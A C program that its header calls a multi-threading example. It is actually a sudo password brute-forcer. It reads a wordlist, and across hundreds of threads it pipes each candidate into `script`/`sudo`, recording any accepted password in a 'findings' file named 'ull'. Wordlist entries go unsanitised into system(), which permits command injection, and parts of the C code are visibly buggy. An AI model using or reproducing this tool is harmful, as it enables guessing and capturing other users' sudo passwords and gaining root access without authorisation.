/* 
 * 
 * 
 *  this is just an example of multi-threading
 *  calling of a shell script from a c program
 *
 *
 *
 *  compilation:
 *   rm th; gcc -Wall -O2 -Wextra -o th loadFthreads.c -lrt -lpthread -fsanitize=undefined ; ./th
 * 
 * 
 * 
 *  sergio rivera 2019
 *  srivera@alumnos.upm.es
 * 
 * 
 */

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>

char t1[] = { "sh -c \"echo " };
char t2[256];

/* if we can sudo echo with this string then, we can save it! */
char t3[] = {"\" | script -qc \"sudo /bin/echo $x >> ull\" | tail -n +2 > /dev/null" }; // ./ull is the file tha contains the findings
char pass[] = { "                                           " };
int g = 0;

/* perform_work function args struct */
typedef struct {
	char arg_1[20];
} arg_struct;

/* counter fo threads */
int count = 0;

/* every thread checks for a new string */
void *perform_work(void *argument) {
	arg_struct *actual_args = argument;
	char *t = malloc(strlen(t1) + strlen(t2) + strlen(t3) + 10000);
	char *t4 = malloc(strlen(t2) + 10000);
	strcpy(t4, "x=");
	strcat(t4, actual_args->arg_1);
	strcat(t4, " ; ");
	strcpy(t, t4);
	strcat(t, t1);
	strcat(t, "$x");
	strcat(t, t3);
	system(t);

	++count;
	printf("t: %s", t);
	printf(",  Thread number = %d \n", count);

	return NULL;
}

int doJobs(char * dict, int firstLine, int lastLine, int NconThr) {

	int lines_allocated = 1280000;
	int max_line_len = 100000;

	/* allocate lines of text */
	char **words = (char **) malloc(sizeof(char*) * lines_allocated);
	if (words == NULL) {
		fprintf(stderr, "Out of memory (1).\n");
		exit(1);
	}

	FILE *fp = fopen(dict, "r");
	if (fp == NULL) {
		fprintf(stderr, "Error opening file.\n");
		exit(2);
	}

	int i = 0;
	int kk = 0;

	while (firstLine > 0 ?
			((fgets(words, max_line_len - 1, fp) != NULL) & (kk++ < firstLine)) :
			(1 == 0)) {
		;
	}

	for (i = 0; 1; i++) {
		int j;

		/* have we gone over our line allocation? */
		if (i >= lines_allocated) {
			int new_size;

			/* Double our allocation and re-allocate */
			new_size = lines_allocated * 2;
			words = (char **) realloc(words, sizeof(char*) * new_size);
			if (words == NULL) {
				fprintf(stderr, "Out of memory.\n");
				exit(3);
			}
			lines_allocated = new_size;
		}

		/* allocate space for the next line */
		words[i] = malloc(max_line_len);
		if (words[i] == NULL) {
			fprintf(stderr, "Out of memory (3).\n");
			exit(4);
		}

		if (fgets(words[i], max_line_len - 1, fp) == NULL)
			break;

		/* get rid of CR or LF at end of line */
		for (j = strlen(words[i]) - 1;
				j >= 0 && (words[i][j] == '\n' || words[i][j] == '\r'); j--)
			;
		words[i][j + 1] = '\0';

		if (i >= lastLine)
			break;
	}

	/* close file */
	fclose(fp);

	pthread_t threads[NconThr];
	int result_code, index;
	int *ptr[NconThr];
	index = 0;
	int k = 0;
	while (index + k - NconThr < i) {
		for (index = 0; index < NconThr; ++index) {
			if (index + k < i) {
				arg_struct *args = malloc(sizeof(arg_struct) * NconThr + 1);
				strcpy(args[index].arg_1, words[index + k]);
				result_code = pthread_create(&threads[index],
				NULL, perform_work, (void *) &args[index]);
				assert(0 == result_code);
			}
		}
		/* wait for each thread to complete */
		for (index = 0; index < NconThr; ++index) {
			if (index + k < i) {
				// block until thread 'index' completes
				result_code = pthread_join(threads[index],
						(void**) &(ptr[index]));
				assert(0 == result_code);
			}
		}
		printf("------------------ i: %d , NconThr: %d , k: %d , index: %d\n",
				i, NconThr, k, index);
		printf("In main: All threads completed successfully\n");
		k += NconThr;
	}
	for (; i >= 0; i--)
		free(words[i]);
	free(words);

	return 0;
}

/* main function */
int main(void) {
	int NThreads = 554;       // parallel threads
	int NPwd = NThreads * 10; // batch of jobs - words to read from file each time
	int i = 0;

/*
$ cat myFileWithAWordPerLine
 ...
 arazano
 araza15
 arazadi
 arazark
 arazal1
 araza09
 arazona
 arazo15
 ...
*/
	while (i < 500) {
		doJobs("myFileWithAWordPerLine", NPwd * i, NPwd, NThreads);
		i++;
	}
}
